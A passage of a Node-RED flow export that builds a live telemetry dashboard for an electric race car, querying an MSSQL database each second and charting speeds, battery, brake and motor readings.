[
    {
        "id": "8c02145f70bf7c6a",
        "type": "tab",
        "label": "General",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "149f680d508ad4ad",
        "type": "tab",
        "label": "Warnings",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "4a2f2f6c3794d699",
        "type": "tab",
        "label": "MC",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "2b8b862ad49c5254",
        "type": "tab",
        "label": "Cooling",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "c91b7712e66969da",
        "type": "tab",
        "label": "EV Critical",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "54ee7ab52b252314",
        "type": "tab",
        "label": "EV Useful",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "594e9fd18f91cc50",
        "type": "tab",
        "label": "EV Other",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "0208dc768b26306e",
        "type": "tab",
        "label": "General Past Data",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "eb28fbcf28e5aae9",
        "type": "tab",
        "label": "General Past Data Single Chart",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "a5a35a884df38a1a",
        "type": "tab",
        "label": "MC Past Data",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "58631339f9f9424f",
        "type": "tab",
        "label": "EV Critical Past Data",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "933ce03686fddbab",
        "type": "MSSQL-CN",
        "tdsVersion": "7_4",
        "name": "litel SQL Server",
        "server": "20.81.190.176",
        "port": "1433",
        "encyption": true,
        "trustServerCertificate": true,
        "database": "Live Telemetry",
        "useUTC": true,
        "connectTimeout": "15000",
        "requestTimeout": "15000",
        "cancelTimeout": "5000",
        "pool": "5",
        "parseJSON": false,
        "enableArithAbort": true
    },
    {
        "id": "6988e854229f01bb",
        "type": "ui_tab",
        "name": "EV Useful",
        "icon": "dashboard",
        "order": 6,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "e143306a96f4ee24",
        "type": "ui_base",
        "theme": {
            "name": "theme-custom",
            "lightTheme": {
                "default": "#0094CE",
                "baseColor": "#0061ff",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "darkTheme": {
                "default": "#097479",
                "baseColor": "#0433ff",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "customTheme": {
                "name": "Pitt Theme 1",
                "default": "#4B7930",
                "baseColor": "#ffffff",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "reset": false
            },
            "themeState": {
                "base-color": {
                    "default": "#4B7930",
                    "value": "#ffffff",
                    "edited": true
                },
                "page-titlebar-backgroundColor": {
                    "value": "#ffb81c",
                    "edited": true
                },
                "page-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "page-sidebar-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "group-textColor": {
                    "value": "#ffb81c",
                    "edited": true
                },
                "group-borderColor": {
                    "value": "#003594",
                    "edited": true
                },
                "group-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "widget-textColor": {
                    "value": "#111111",
                    "edited": false
                },
                "widget-backgroundColor": {
                    "value": "#003594",
                    "edited": true
                },
                "widget-borderColor": {
                    "value": "#ffffff",
                    "edited": true
                },
                "base-font": {
                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
                }
            },
            "angularTheme": {
                "primary": "indigo",
                "accents": "blue",
                "warn": "red",
                "background": "grey",
                "palette": "light"
            }
        },
        "site": {
            "name": "Node-RED Dashboard",
            "hideToolbar": "false",
            "allowSwipe": "false",
            "lockMenu": "false",
            "allowTempTheme": "true",
            "dateFormat": "DD/MM/YYYY",
            "sizes": {
                "sx": 48,
                "sy": 48,
                "gx": 6,
                "gy": 6,
                "cx": 6,
                "cy": 6,
                "px": 10,
                "py": 6
            }
        }
    },
    {
        "id": "0792dde75d0b55e3",
        "type": "ui_group",
        "name": "EV_Useful",
        "tab": "6988e854229f01bb",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "c46b2c1ea6e37152",
        "type": "ui_tab",
        "name": "EV Critical",
        "icon": "dashboard",
        "order": 5,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "9f715c58ec97d4b1",
        "type": "ui_group",
        "name": "EV_Critical",
        "tab": "c46b2c1ea6e37152",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "b5264e960f9eb7eb",
        "type": "ui_group",
        "name": "EV_Other",
        "tab": "de192e18d9a5b7a3",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "de192e18d9a5b7a3",
        "type": "ui_tab",
        "name": "EV Other",
        "icon": "dashboard",
        "order": 7,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "c012dff6afbc6486",
        "type": "ui_tab",
        "name": "General",
        "icon": "dashboard",
        "order": 1,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "1fc0dcc2cd8a691a",
        "type": "ui_group",
        "name": "Others",
        "tab": "c012dff6afbc6486",
        "order": 4,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "a5f2ac06c2cd3214",
        "type": "ui_tab",
        "name": "MC",
        "icon": "dashboard",
        "order": 3,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "4dce402db33a1ac6",
        "type": "ui_group",
        "name": "MC",
        "tab": "a5f2ac06c2cd3214",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "07c9feb509957806",
        "type": "ui_group",
        "name": "Temperatures",
        "tab": "c012dff6afbc6486",
        "order": 3,
        "disp": true,
        "width": "20",
        "collapse": false,
        "className": ""
    },
    {
        "id": "b1fa7a4b77652777",
        "type": "ui_group",
        "name": "Speeds",
        "tab": "c012dff6afbc6486",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "33c8b737093be8e2",
        "type": "ui_group",
        "name": "Battery Stats",
        "tab": "c012dff6afbc6486",
        "order": 2,
        "disp": true,
        "width": "10",
        "collapse": false,
        "className": ""
    },
    {
        "id": "092d587d2f13b174",
        "type": "ui_tab",
        "name": "General Past Data",
        "icon": "dashboard",
        "order": 8,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "881b1308b85cd435",
        "type": "ui_group",
        "name": "Past Data View",
        "tab": "092d587d2f13b174",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "f5d559db1bfa8c5b",
        "type": "ui_tab",
        "name": "General Past Data Single Chart",
        "icon": "dashboard",
        "order": 9,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "138120695bcd6cbc",
        "type": "ui_group",
        "name": "Past Data 2",
        "tab": "f5d559db1bfa8c5b",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "a0f03a3236d45623",
        "type": "ui_tab",
        "name": "MC Past Data",
        "icon": "dashboard",
        "order": 10,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "37fa01b38570666f",
        "type": "ui_group",
        "name": "MC Past Data",
        "tab": "a0f03a3236d45623",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "524b980f49e1c16c",
        "type": "ui_tab",
        "name": "EV Critical Past Data",
        "icon": "dashboard",
        "order": 11,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "7f4edb2103a1ccbd",
        "type": "ui_group",
        "name": "EV Critical Past Data",
        "tab": "524b980f49e1c16c",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "24b040a09058c6d9",
        "type": "ui_tab",
        "name": "Warnings",
        "icon": "dashboard",
        "order": 2,
        "disabled": true,
        "hidden": true
    },
    {
        "id": "879eba49fd286672",
        "type": "ui_group",
        "name": "Warnings",
        "tab": "24b040a09058c6d9",
        "order": 1,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "90bb443c7deb3cd0",
        "type": "ui_group",
        "name": "Cooling",
        "tab": "3002639870ea08ed",
        "order": 5,
        "disp": true,
        "width": "30",
        "collapse": false,
        "className": ""
    },
    {
        "id": "3002639870ea08ed",
        "type": "ui_tab",
        "name": "Cooling",
        "icon": "dashboard",
        "order": 4,
        "disabled": true,
        "hidden": true
    },
    {
        "id": "3f7c505f0970583f",
        "type": "inject",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 230,
        "y": 260,
        "wires": [
            [
                "4ca42c195c0ba79d"
            ]
        ]
    },
    {
        "id": "4ca42c195c0ba79d",
        "type": "MSSQL",
        "z": "8c02145f70bf7c6a",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 420,
        "y": 260,
        "wires": [
            [
                "a38e33d6cec1d4e3"
            ]
        ]
    },
    {
        "id": "a38e33d6cec1d4e3",
        "type": "function",
        "z": "8c02145f70bf7c6a",
        "name": "function 1",
        "func": "var sigFigs = 2;\n\nvar VCU_brakePressureSensorDiag =\n{\n    topic: \"Brake Pressure\",\n    payload: msg.payload[0].VCU_brakePressureSensorDiag\n}\ntry {\n    VCU_brakePressureSensorDiag.payload = VCU_brakePressureSensorDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_brakeBiasAim =\n{\n    topic: \"Brake Bias Aim (ratio)\",\n    payload: msg.payload[0].VCU_brakeBiasAim\n}\ntry {\n    VCU_brakeBiasAim.payload = VCU_brakeBiasAim.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_steeringAngle =\n{\n    topic: \"Steering Angle (deg)\",\n    payload: msg.payload[0].VCU_steeringAngle\n}\ntry {\n    VCU_steeringAngle.payload = VCU_steeringAngle.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_vehicleSpeed =\n{\n    topic: \"Vehicle Speed (km/hr)\",\n    payload: msg.payload[0].VCU_vehicleSpeed\n}\ntry {\n    VCU_vehicleSpeed.payload = VCU_vehicleSpeed.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_front_left =\n{\n    topic: \"Front Left Wheel Speed\",\n    payload: msg.payload[0].wheel_speed_front_left\n}\ntry {\n    wheel_speed_front_left.payload = wheel_speed_front_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_front_right =\n{\n    topic: \"Front Right Wheel Speed\",\n    payload: msg.payload[0].wheel_speed_front_right\n}\ntry {\n    wheel_speed_front_right.payload = wheel_speed_front_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_rear_left =\n{\n    topic: \"Rear Left Wheel Speed\",\n    payload: msg.payload[0].wheel_speed_rear_left\n}\ntry {\n    wheel_speed_rear_left.payload = wheel_speed_rear_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar wheel_speed_rear_right =\n{\n    topic: \"Rear Right Wheel Speed\",\n    payload: msg.payload[0].wheel_speed_rear_right\n}\ntry {\n    wheel_speed_rear_right.payload = wheel_speed_rear_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Current =\n{\n    topic: \"Pack Current (A)\",\n    payload: msg.payload[0].Pack_Current\n}\ntry {\n    Pack_Current.payload = Pack_Current.payload.toFixed(sigFigs)\n} catch { }\n\n// var pack_current =\n// {\n//     topic: \"pack_current\",\n//     payload: msg.payload[0].pack_current\n// }\n// try {\n//     pack_current.payload = pack_current.payload.toFixed(sigFigs)\n// } catch { }\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload[0].High_Temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (aH)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Statuses\",\n    payload: msg.payload[0].Failsafe_Statuses\n}\ntry {\n    Failsafe_Statuses.payload = Failsafe_Statuses.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_motorSpeed =\n{\n    topic: \"INV Motor Speed (deg/s)\",\n    payload: msg.payload[0].INV_motorSpeed\n}\ntry {\n    INV_motorSpeed.payload = INV_motorSpeed.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload[0].INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_rear_right =\n{\n    topic: \"Rear Right Brake Temperature (ºC)\",\n    payload: msg.payload[0].brake_temperature_rear_right\n}\ntry {\n    brake_temperature_rear_right.payload = brake_temperature_rear_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_rear_left =\n{\n    topic: \"Rear Left Brake Temperature\",\n    payload: msg.payload[0].brake_temperature_rear_left\n}\ntry {\n    brake_temperature_rear_left.payload = brake_temperature_rear_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_front_right =\n{\n    topic: \"Front Right Brake Temperature\",\n    payload: msg.payload[0].brake_temperature_front_right\n}\ntry {\n    brake_temperature_front_right.payload = brake_temperature_front_right.payload.toFixed(sigFigs)\n} catch { }\n\nvar brake_temperature_front_left =\n{\n    topic: \"Front Left Brake Temperature\",\n    payload: msg.payload[0].brake_temperature_front_left\n}\ntry {\n    brake_temperature_front_left.payload = brake_temperature_front_left.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Torque_Feedback =\n{\n    topic: \"INV Torque Feedback (N*m)\",\n    payload: msg.payload[0].INV_Torque_Feedback\n}\ntry {\n    INV_Torque_Feedback.payload = INV_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Commanded_Torque =\n{\n    topic: \"INV Command Torque (N*m)\",\n    payload: msg.payload[0].INV_Commanded_Torque\n}\ntry {\n    INV_Commanded_Torque.payload = INV_Commanded_Torque.payload.toFixed(sigFigs)\n} catch { }\n\nvar BMS_failsafeStatuses =\n{\n    topic: \"BMS Failsafe Statuses\",\n    payload: msg.payload[0].BMS_failsafeStatuses\n}\ntry {\n    BMS_failsafeStatuses.payload = BMS_failsafeStatuses.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_dcBusVoltage =\n{\n    topic: \"Inverter DC Bus Voltage (V)\",\n    payload: msg.payload[0].INV_dcBusVoltage\n}\ntry {\n    INV_dcBusVoltage.payload = INV_dcBusVoltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_brakePressureSensorDiag,\n    VCU_brakeBiasAim,\n    VCU_steeringAngle,\n    VCU_vehicleSpeed,\n    wheel_speed_front_left,\n    wheel_speed_front_right,\n    wheel_speed_rear_left,\n    wheel_speed_rear_right,\n    Pack_Current,\n    High_Temperature,\n    Low_Temperature,\n    Pack_Open_Voltage,\n    Pack_Amphours,\n    Failsafe_Statuses,\n    INV_motorSpeed,\n    INV_Motor_Temp,\n    brake_temperature_rear_right,\n    brake_temperature_rear_left,\n    brake_temperature_front_right,\n    brake_temperature_front_left,\n    INV_Torque_Feedback,\n    INV_Commanded_Torque,\n    BMS_failsafeStatuses,\n    INV_dcBusVoltage\n];",
        "outputs": 24,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 640,
        "y": 260,
        "wires": [
            [
                "7372b0c8375233ab"
            ],
            [
                "252332f614f27f48"
            ],
            [
                "5c7a52acfb042f7d"
            ],
            [
                "d89b58f5a5f64d45"
            ],
            [
                "e1adf8a1a4817986"
            ],
            [
                "e1adf8a1a4817986"
            ],
            [
                "59f0372f8bbdacfb"
            ],
            [
                "59f0372f8bbdacfb"
            ],
            [
                "77a4d0f2c7b4e0f6"
            ],
            [
                "454658aa5a0083f5"
            ],
            [
                "454658aa5a0083f5"
            ],
            [
                "e417df67833a0d17"
            ],
            [
                "c5bd1b62ea3bf354"
            ],
            [
                "7829c2378222bdef"
            ],
            [
                "3e39d2ca77253c9e"
            ],
            [
                "0bf6cbe78b4de339"
            ],
            [
                "6c6a4e4d20debb6d"
            ],
            [
                "6c6a4e4d20debb6d"
            ],
            [
                "c922b91536e0ce56"
            ],
            [
                "c922b91536e0ce56"
            ],
            [
                "f8f0139fcaf8d9e6"
            ],
            [
                "f2c11678b365e4bd"
            ],
            [
                "2b58eb8144aab92a"
            ],
            [
                "da8bb60e587ca5ba"
            ]
        ]
    },
    {
        "id": "7372b0c8375233ab",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "1fc0dcc2cd8a691a",
        "order": 1,
        "width": "10",
        "height": "6",
        "label": "Brake Pressure",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#dbc8b6",
            "#000000",
            "#000000",
            "#000000",
            "#000000"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "5c7a52acfb042f7d",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "1fc0dcc2cd8a691a",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Steering Angle",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "d89b58f5a5f64d45",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "b1fa7a4b77652777",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Vehicle Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "e1adf8a1a4817986",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "b1fa7a4b77652777",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Front Wheel Speed",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1090,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "59f0372f8bbdacfb",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "b1fa7a4b77652777",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "Rear Wheel Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1090,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "77a4d0f2c7b4e0f6",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "33c8b737093be8e2",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Pack Current",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "454658aa5a0083f5",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "07c9feb509957806",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "High/Low Battery Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 890,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "e417df67833a0d17",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "33c8b737093be8e2",
        "order": 2,
        "width": "10",
        "height": "6",
        "label": "Pack Open Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 870,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "c5bd1b62ea3bf354",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "33c8b737093be8e2",
        "order": 4,
        "width": "10",
        "height": "6",
        "label": "Pack Amp Hours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 870,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "3e39d2ca77253c9e",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "b1fa7a4b77652777",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "0bf6cbe78b4de339",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "07c9feb509957806",
        "order": 19,
        "width": "10",
        "height": "6",
        "label": "Motor Temp",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 580,
        "wires": [
            []
        ]
    },
    {
        "id": "c922b91536e0ce56",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "07c9feb509957806",
        "order": 10,
        "width": "10",
        "height": "6",
        "label": "Front Brake Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1090,
        "y": 640,
        "wires": [
            []
        ]
    },
    {
        "id": "6c6a4e4d20debb6d",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "07c9feb509957806",
        "order": 11,
        "width": "10",
        "height": "6",
        "label": "Rear Brake Temps",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1090,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "f8f0139fcaf8d9e6",
        "type": "ui_chart",
        "z": "8c02145f70bf7c6a",
        "name": "",
        "group": "1fc0dcc2cd8a691a",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Torque Feedback",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
